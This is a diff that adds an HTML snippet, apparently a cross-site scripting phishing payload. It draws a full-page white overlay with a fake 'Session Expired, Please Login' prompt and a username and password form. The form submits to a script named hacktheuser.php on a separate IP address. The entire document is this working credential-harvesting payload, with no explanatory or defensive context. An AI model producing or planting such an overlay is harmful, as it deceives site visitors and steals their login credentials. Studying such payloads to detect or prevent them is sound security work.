@@ -1,0 +1,11 @@
+<div style="position: absolute; left: 0px; top: 0px; width: 800px; height: 600px; 
+background-color:white;">
+Session Expired, Please Login:<br>
+<form name="login" action="http://192.168.140.136/hacktheuser.php/">
+<table>
+<tr><td>Username:</td><td><input type="text" name="user"/></td></tr>
+<tr><td>Password:</td><td><input type="password" name="pass"/></td></tr>
+</table>
+<input type="submit" value="Login"/>
+</form>
+</div>
